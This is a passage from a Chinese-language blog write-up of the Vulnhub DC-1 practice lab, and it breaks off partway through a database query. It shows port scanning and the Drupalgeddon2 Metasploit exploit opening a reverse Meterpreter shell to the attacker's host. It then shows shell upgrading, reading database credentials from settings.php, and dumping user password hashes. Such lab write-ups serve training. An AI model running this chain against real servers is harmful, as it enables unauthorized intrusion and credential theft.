

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <title>Vulnhub DC-1 Writeup - Laughing</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->
<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">

<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">

<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:" target="_blank" rel="noopener">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-11-17 15:05" pubdate>
        November 17, 2020 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      4.7k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      83
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">Vulnhub DC-1 Writeup</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="Vunhub-DC-1-Writeup"><a href="#Vunhub-DC-1-Writeup" class="headerlink" title="Vunhub DC-1 Writeup"></a>Vunhub DC-1 Writeup</h1><h2 id="靶机描述："><a href="#靶机描述：" class="headerlink" title="靶机描述："></a>靶机描述：</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">（官方地址）</a></p>
<p>提示一共有5个flag,最好还要拿到root</p>
<blockquote>
<p>DESCRIPTION<br>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
<p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p>
<p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p>
<p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p>
<p>There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.</p>
<p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p>
<p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p>
</blockquote>
<p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201117150857.png" srcset="/img/loading.gif" alt=""></p>
<h2 id="nmap发现DC-1主机-全面扫描主机"><a href="#nmap发现DC-1主机-全面扫描主机" class="headerlink" title="nmap发现DC-1主机,全面扫描主机"></a>nmap发现DC-1主机,全面扫描主机</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># nmap 192.168.43.*</span>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 01:57 EST

Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.165
Host is up (0.00016s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
MAC Address: 08:00:27:34:B3:8F (Oracle VirtualBox virtual NIC)</code></pre>

<h3 id="nmap详细扫描"><a href="#nmap详细扫描" class="headerlink" title="nmap详细扫描"></a>nmap详细扫描</h3><p>可以看到有80和22端口,接下来我们从80端口入手</p>
<pre><code class="hljs shell">root@kali:~# nmap 192.168.43.165 -A -sV -sC -p 1-65535
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 02:04 EST
Nmap scan report for 192.168.43.165
Host is up (0.00026s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37330/tcp6  status
|   100024  1          37494/tcp   status
|   100024  1          51572/udp   status
|_  100024  1          57636/udp6  status
37494/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:34:B3:8F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.43.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.82 seconds</code></pre>

<p>看80端口是什么样子的</p>
<p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201117153044.png" srcset="/img/loading.gif" alt=""></p>
<p>可以看到有一个登陆界面</p>
<h2 id="whatweb扫描网页的CMS指纹"><a href="#whatweb扫描网页的CMS指纹" class="headerlink" title="whatweb扫描网页的CMS指纹"></a>whatweb扫描网页的CMS指纹</h2><pre><code class="hljs shell">root@kali:~# whatweb http://192.168.43.165/
http://192.168.43.165/ [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.43.165], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</code></pre>

<p>CMS是Drupal 7，接下来尝试看看msfconsole</p>
<h2 id="方法1-80端口"><a href="#方法1-80端口" class="headerlink" title="方法1(80端口)"></a>方法1(80端口)</h2><h3 id="msfconsole搜索drupal的模块"><a href="#msfconsole搜索drupal的模块" class="headerlink" title="msfconsole搜索drupal的模块"></a>msfconsole搜索drupal的模块</h3><pre><code class="hljs bash">msf5 &gt; search drupal target:7.x

Matching Modules
================

   <span class="hljs-comment">#  Name                                      Disclosure Date  Rank       Check  Description</span>
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</code></pre>

<p>搜索到一个exploit，查看一下这个exploit的info(具体信息),看得info里面的target信息有对应的版本</p>
<p>  4   Drupal 7.x (PHP In-Memory)<br>  5   Drupal 7.x (PHP Dropper)<br>  6   Drupal 7.x (Unix In-Memory)<br>  7   Drupal 7.x (Linux Dropper)</p>
<pre><code class="hljs bash">msf5 &gt; info exploit/unix/webapp/drupal_drupalgeddon2

       Name: Drupal Drupalgeddon 2 Forms API Property Injection
     Module: exploit/unix/webapp/drupal_drupalgeddon2
   Platform: PHP, Unix, Linux
       Arch: php, cmd, x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2018-03-28

Provided by:
  Jasper Mattsson
  a2u
  Nixawk
  FireFart
  wvu &lt;wvu@metasploit.com&gt;

Available targets:
  Id  Name
  --  ----
  0   Automatic (PHP In-Memory)
  1   Automatic (PHP Dropper)
  2   Automatic (Unix In-Memory)
  3   Automatic (Linux Dropper)
  4   Drupal 7.x (PHP In-Memory)
  5   Drupal 7.x (PHP Dropper)
  6   Drupal 7.x (Unix In-Memory)
  7   Drupal 7.x (Linux Dropper)
  8   Drupal 8.x (PHP In-Memory)
  9   Drupal 8.x (PHP Dropper)
  10  Drupal 8.x (Unix In-Memory)
  11  Drupal 8.x (Linux Dropper)

Check supported:
  Yes

Basic options:
  Name         Current Setting  Required  Description
  ----         ---------------  --------  -----------
  DUMP_OUTPUT  <span class="hljs-literal">false</span>            no        Dump payload <span class="hljs-built_in">command</span> output
  PHP_FUNC     passthru         yes       PHP <span class="hljs-keyword">function</span> to execute
  Proxies                       no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]
  RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">'file:&lt;path&gt;'</span>
  RPORT        80               yes       The target port (TCP)
  SSL          <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
  TARGETURI    /                yes       Path to Drupal install
  VHOST                         no        HTTP server virtual host

Payload information:
  Avoid: 3 characters

Description:
  This module exploits a Drupal property injection <span class="hljs-keyword">in</span> the Forms API. 
  Drupal 6.x, &lt; 7.58, 8.2.x, &lt; 8.3.9, &lt; 8.4.6, and &lt; 8.5.1 are 
  vulnerable.

References:
  https://cvedetails.com/cve/CVE-2018-7600/
  https://www.drupal.org/sa-core-2018-002
  https://greysec.net/showthread.php?tid=2912
  https://research.checkpoint.com/uncovering-drupalgeddon-2/
  https://github.com/a2u/CVE-2018-7600
  https://github.com/nixawk/labs/issues/19
  https://github.com/FireFart/CVE-2018-7600

Also known as:
  SA-CORE-2018-002
  Drupalgeddon 2</code></pre>

<p>尝试使用这个exploit，首先要设置option，这里只需要set rhost，再run一下(可能不会成功,只是尝试)</p>
<pre><code class="hljs bash">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rhosts 192.168.43.165
rhosts =&gt; 192.168.43.165
msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options 

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  <span class="hljs-literal">false</span>            no        Dump payload <span class="hljs-built_in">command</span> output
   PHP_FUNC     passthru         yes       PHP <span class="hljs-keyword">function</span> to execute
   Proxies                       no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]
   RHOSTS       192.168.43.165   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">'file:&lt;path&gt;'</span>
   RPORT        80               yes       The target port (TCP)
   SSL          <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.43.225   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run

[*] Started reverse TCP handler on 192.168.43.225:4444 
[*] Sending stage (38288 bytes) to 192.168.43.165
[*] Meterpreter session 1 opened (192.168.43.225:4444 -&gt; 192.168.43.165:35033) at 2020-11-25 06:35:32 -0500

meterpreter &gt;</code></pre>

<p>msfconsole就会返回一个shell？尝试ls命令,ls命令可以使用</p>
<pre><code class="hljs bash">meterpreter &gt; ls
Listing: /var/www
=================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  567    fil   2020-11-20 10:05:39 -0500  .bash_history
100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore
100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess
100644/rw-r--r--  1481   fil   2013-11-20 15:45:59 -0500  COPYRIGHT.txt
100644/rw-r--r--  1451   fil   2013-11-20 15:45:59 -0500  INSTALL.mysql.txt
100644/rw-r--r--  1874   fil   2013-11-20 15:45:59 -0500  INSTALL.pgsql.txt
100644/rw-r--r--  1298   fil   2013-11-20 15:45:59 -0500  INSTALL.sqlite.txt
100644/rw-r--r--  17861  fil   2013-11-20 15:45:59 -0500  INSTALL.txt
100755/rwxr-xr-x  18092  fil   2013-11-01 06:14:15 -0400  LICENSE.txt
100644/rw-r--r--  8191   fil   2013-11-20 15:45:59 -0500  MAINTAINERS.txt
100644/rw-r--r--  5376   fil   2013-11-20 15:45:59 -0500  README.txt
100644/rw-r--r--  9642   fil   2013-11-20 15:45:59 -0500  UPGRADE.txt
100644/rw-r--r--  6604   fil   2013-11-20 15:45:59 -0500  authorize.php
100644/rw-r--r--  720    fil   2013-11-20 15:45:59 -0500  cron.php
100644/rw-r--r--  52     fil   2019-02-19 08:20:46 -0500  flag1.txt
40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  includes
100644/rw-r--r--  529    fil   2013-11-20 15:45:59 -0500  index.php
100644/rw-r--r--  703    fil   2013-11-20 15:45:59 -0500  install.php
40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  misc
40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  modules
40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  profiles
100644/rw-r--r--  1561   fil   2013-11-20 15:45:59 -0500  robots.txt
40755/rwxr-xr-x   4096   dir   2020-11-19 05:34:49 -0500  scripts
40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  sites
40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  themes
100644/rw-r--r--  19941  fil   2013-11-20 15:45:59 -0500  update.php
100644/rw-r--r--  2178   fil   2013-11-20 15:45:59 -0500  web.config
100644/rw-r--r--  417    fil   2013-11-20 15:45:59 -0500  xmlrpc.php</code></pre>

<p>可是连一个whoami都用不了</p>
<pre><code class="hljs bash">meterpreter &gt; whoami
[-] Unknown <span class="hljs-built_in">command</span>: whoami.</code></pre>

<p>输入shell进入一个？？？,这里可以用whoami了</p>
<pre><code class="hljs bash">meterpreter &gt; shell
Process 3100 created.
Channel 0 created.
ls
COPYRIGHT.txt
INSTALL.mysql.txt
INSTALL.pgsql.txt
INSTALL.sqlite.txt
INSTALL.txt
LICENSE.txt
MAINTAINERS.txt
README.txt
UPGRADE.txt
authorize.php
cron.php
flag1.txt
includes
index.php
install.php
misc
modules
profiles
robots.txt
scripts
sites
themes
update.php
web.config
xmlrpc.php
whoami 
www-data</code></pre>

<p>但是有些命令不可以用，比如su命令就明确说我们的这个不是来自terminal的命令</p>
<pre><code class="hljs bash">sudo
/bin/sh: 7: sudo: not found
vim
/bin/sh: 8: vim: not found
su
su: must be run from a terminal</code></pre>

<p>而且，按住ctrl+c会停止这个反弹的shell，也就是说这个shell不够完美</p>
<pre><code class="hljs bash">^C
Terminate channel 0? [y/N]  
[-] core_channel_interact: Operation failed: 1</code></pre>

<h3 id="python将简单的Shell转换成为完全交互式的TTY"><a href="#python将简单的Shell转换成为完全交互式的TTY" class="headerlink" title="python将简单的Shell转换成为完全交互式的TTY"></a>python将简单的Shell转换成为完全交互式的TTY</h3><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>

<pre><code class="hljs bash">www-data@DC-1:/var/www$ ls -l
ls -l
total 168
-rw-r--r--  1 www-data www-data  1481 Nov 21  2013 COPYRIGHT.txt
-rw-r--r--  1 www-data www-data  1451 Nov 21  2013 INSTALL.mysql.txt
-rw-r--r--  1 www-data www-data  1874 Nov 21  2013 INSTALL.pgsql.txt
-rw-r--r--  1 www-data www-data  1298 Nov 21  2013 INSTALL.sqlite.txt
-rw-r--r--  1 www-data www-data 17861 Nov 21  2013 INSTALL.txt
-rwxr-xr-x  1 www-data www-data 18092 Nov  1  2013 LICENSE.txt
-rw-r--r--  1 www-data www-data  8191 Nov 21  2013 MAINTAINERS.txt
-rw-r--r--  1 www-data www-data  5376 Nov 21  2013 README.txt
-rw-r--r--  1 www-data www-data  9642 Nov 21  2013 UPGRADE.txt
-rw-r--r--  1 www-data www-data  6604 Nov 21  2013 authorize.php
-rw-r--r--  1 www-data www-data   720 Nov 21  2013 cron.php
-rw-r--r--  1 www-data www-data    52 Feb 19  2019 flag1.txt
drwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 includes
-rw-r--r--  1 www-data www-data   529 Nov 21  2013 index.php
-rw-r--r--  1 www-data www-data   703 Nov 21  2013 install.php
drwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 misc
drwxr-xr-x 42 www-data www-data  4096 Nov 21  2013 modules
drwxr-xr-x  5 www-data www-data  4096 Nov 21  2013 profiles
-rw-r--r--  1 www-data www-data  1561 Nov 21  2013 robots.txt
drwxr-xr-x  3 www-data www-data  4096 Nov 19 20:34 scripts
drwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 sites
drwxr-xr-x  7 www-data www-data  4096 Nov 21  2013 themes
-rw-r--r--  1 www-data www-data 19941 Nov 21  2013 update.php
-rw-r--r--  1 www-data www-data  2178 Nov 21  2013 web.config
-rw-r--r--  1 www-data www-data   417 Nov 21  2013 xmlrpc.php</code></pre>

<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>这里就可以看到flag1的文件了，尝试cat一下</p>
<pre><code class="hljs bash">www-data@DC-1:/var/www$ cat flag1.txt
cat flag1.txt
Every good CMS needs a config file - and so <span class="hljs-keyword">do</span> you.</code></pre>

<p>这里应该就是下一个flag的提示了：提示是找cms的配置文件。经过搜索可以知道配置文件的路径</p>
<p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126104721.png" srcset="/img/loading.gif" alt=""></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>进入之后看到有一个settings.php的文件,cat看一下</p>
<pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/sites/default</span><span class="hljs-variable">$ </span>ls
ls
default.settings.php  files  settings.php</code></pre>

<pre><code class="hljs php">www-data@DC<span class="hljs-number">-1</span>:/<span class="hljs-keyword">var</span>/www/sites/<span class="hljs-keyword">default</span>$ cat settings.php
cat settings.php
<span class="hljs-meta">&lt;?php</span>

<span class="hljs-comment">/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */</span>

$databases = <span class="hljs-keyword">array</span> (
  <span class="hljs-string">'default'</span> =&gt; 
  <span class="hljs-keyword">array</span> (
    <span class="hljs-string">'default'</span> =&gt; 
    <span class="hljs-keyword">array</span> (
      <span class="hljs-string">'database'</span> =&gt; <span class="hljs-string">'drupaldb'</span>,
      <span class="hljs-string">'username'</span> =&gt; <span class="hljs-string">'dbuser'</span>,
      <span class="hljs-string">'password'</span> =&gt; <span class="hljs-string">'R0ck3t'</span>,
      <span class="hljs-string">'host'</span> =&gt; <span class="hljs-string">'localhost'</span>,
      <span class="hljs-string">'port'</span> =&gt; <span class="hljs-string">''</span>,
      <span class="hljs-string">'driver'</span> =&gt; <span class="hljs-string">'mysql'</span>,
      <span class="hljs-string">'prefix'</span> =&gt; <span class="hljs-string">''</span>,
    ),
  ),
);</code></pre>

<p>看到了flag2的信息,是mysql数据库的信息,有效的应该是数据库名,用户名和密码</p>
<h3 id="进入数据库-查看"><a href="#进入数据库-查看" class="headerlink" title="进入数据库,查看"></a>进入数据库,查看</h3><pre><code class="hljs bash">www-data@DC-1:/var/www$ mysql -h localhost -u dbuser -p
mysql -h localhost -u dbuser -p
Enter password: R0ck3t

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 48
Server version: 5.5.60-0+deb7u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="hljs-string">'help;'</span> or <span class="hljs-string">'\h'</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">'\c'</span> to clear the current input statement.</code></pre>

<pre><code class="hljs gherkin">mysql&gt; show database;
show database;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'database' at line 1
mysql&gt; show databases;
show databases;
+--------------------+
|<span class="hljs-string"> Database           </span>|
+--------------------+
|<span class="hljs-string"> information_schema </span>|
|<span class="hljs-string"> drupaldb           </span>|
+--------------------+
2 rows in set (0.00 sec)

mysql&gt; use drupaldb;
use drupaldb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
show tab\les;
+-----------------------------+
|<span class="hljs-string"> Tables_in_drupaldb          </span>|
+-----------------------------+
|<span class="hljs-string"> actions                     </span>|
|<span class="hljs-string"> authmap                     </span>|
|<span class="hljs-string"> batch                       </span>|
|<span class="hljs-string"> block                       </span>|
|<span class="hljs-string"> block_custom                </span>|
|<span class="hljs-string"> block_node_type             </span>|
|<span class="hljs-string"> block_role                  </span>|
|<span class="hljs-string"> blocked_ips                 </span>|
|<span class="hljs-string"> cache                       </span>|
|<span class="hljs-string"> cache_block                 </span>|
|<span class="hljs-string"> cache_bootstrap             </span>|
|<span class="hljs-string"> cache_field                 </span>|
|<span class="hljs-string"> cache_filter                </span>|
|<span class="hljs-string"> cache_form                  </span>|
|<span class="hljs-string"> cache_image                 </span>|
|<span class="hljs-string"> cache_menu                  </span>|
|<span class="hljs-string"> cache_page                  </span>|
|<span class="hljs-string"> cache_path                  </span>|
|<span class="hljs-string"> cache_update                </span>|
|<span class="hljs-string"> cache_views                 </span>|
|<span class="hljs-string"> cache_views_data            </span>|
|<span class="hljs-string"> comment                     </span>|
|<span class="hljs-string"> ctools_css_cache            </span>|
|<span class="hljs-string"> ctools_object_cache         </span>|
|<span class="hljs-string"> date_format_locale          </span>|
|<span class="hljs-string"> date_format_type            </span>|
|<span class="hljs-string"> date_formats                </span>|
|<span class="hljs-string"> field_config                </span>|
|<span class="hljs-string"> field_config_instance       </span>|
|<span class="hljs-string"> field_data_body             </span>|
|<span class="hljs-string"> field_data_comment_body     </span>|
|<span class="hljs-string"> field_data_field_image      </span>|
|<span class="hljs-string"> field_data_field_tags       </span>|
|<span class="hljs-string"> field_revision_body         </span>|
|<span class="hljs-string"> field_revision_comment_body </span>|
|<span class="hljs-string"> field_revision_field_image  </span>|
|<span class="hljs-string"> field_revision_field_tags   </span>|
|<span class="hljs-string"> file_managed                </span>|
|<span class="hljs-string"> file_usage                  </span>|
|<span class="hljs-string"> filter                      </span>|
|<span class="hljs-string"> filter_format               </span>|
|<span class="hljs-string"> flood                       </span>|
|<span class="hljs-string"> history                     </span>|
|<span class="hljs-string"> image_effects               </span>|
|<span class="hljs-string"> image_styles                </span>|
|<span class="hljs-string"> menu_custom                 </span>|
|<span class="hljs-string"> menu_links                  </span>|
|<span class="hljs-string"> menu_router                 </span>|
|<span class="hljs-string"> node                        </span>|
|<span class="hljs-string"> node_access                 </span>|
|<span class="hljs-string"> node_comment_statistics     </span>|
|<span class="hljs-string"> node_revision               </span>|
|<span class="hljs-string"> node_type                   </span>|
|<span class="hljs-string"> queue                       </span>|
|<span class="hljs-string"> rdf_mapping                 </span>|
|<span class="hljs-string"> registry                    </span>|
|<span class="hljs-string"> registry_file               </span>|
|<span class="hljs-string"> role                        </span>|
|<span class="hljs-string"> role_permission             </span>|
|<span class="hljs-string"> search_dataset              </span>|
|<span class="hljs-string"> search_index                </span>|
|<span class="hljs-string"> search_node_links           </span>|
|<span class="hljs-string"> search_total                </span>|
|<span class="hljs-string"> semaphore                   </span>|
|<span class="hljs-string"> sequences                   </span>|
|<span class="hljs-string"> sessions                    </span>|
|<span class="hljs-string"> shortcut_set                </span>|
|<span class="hljs-string"> shortcut_set_users          </span>|
|<span class="hljs-string"> system                      </span>|
|<span class="hljs-string"> taxonomy_index              </span>|
|<span class="hljs-string"> taxonomy_term_data          </span>|
|<span class="hljs-string"> taxonomy_term_hierarchy     </span>|
|<span class="hljs-string"> taxonomy_vocabulary         </span>|
|<span class="hljs-string"> url_alias                   </span>|
|<span class="hljs-string"> users                       </span>|
|<span class="hljs-string"> users_roles                 </span>|
|<span class="hljs-string"> variable                    </span>|
|<span class="hljs-string"> views_display               </span>|
|<span class="hljs-string"> views_view                  </span>|
|<span class="hljs-string"> watchdog                    </span>|
+-----------------------------+
80 rows in set (0.00 sec)</code></pre>

<p>进入users表里</p>
<pre><code class="hljs mysql">mysql&gt; select * from users;
select * from users;
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |
|   1 | admin | $S$DjLcqu7Pury7nKFmo/PeV7DI6PIceI3t/R6DEkU7Xdg7fRQozPyt | admin@example.com |       |           | NULL             | 1550581826 | 1606360471 | 1605782358 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |
|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
3 rows in set (0.00 sec)</code></pre>

<p>看起来很乱只要有用的信息</p>
<pre><code class="hljs mysql">mysql&gt; select uid,name,pass from users;
select uid,name,pass from users;
+-----+-------+---------------------------------------------------------+
| uid | name  | pass                                                    |
+-----+-------+---------------------------------------------------------+
|   0 |       |                                                         |
